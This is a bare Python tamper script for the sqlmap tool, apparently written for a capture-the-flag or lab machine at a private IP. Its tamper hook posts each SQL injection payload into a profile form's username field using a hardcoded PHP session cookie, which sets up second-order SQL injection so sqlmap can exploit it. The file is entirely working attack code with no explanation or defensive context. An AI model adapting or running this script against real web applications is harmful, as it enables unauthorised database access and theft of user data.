#!/usr/bin/env python3

import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

IP="10.10.68.23"
SESSION_ID="oh6pa6qtitc48cpcqgj7rsld1e"

def dependencies():
    pass

def change_name(payload):
    s = requests.Session()

    req_data = {
        "username":payload,
        "country":"Afghanistan",
        "email":"user@pwn.com",
        "birthday":"2020-11-02",
        "description":""
    }

    cookie = {'PHPSESSID': SESSION_ID}

    response = s.post(f"http://{IP}/", data=req_data, cookies=cookie)
    
    return payload

def tamper(payload, **kwargs):
    change_name(payload)
    return payload

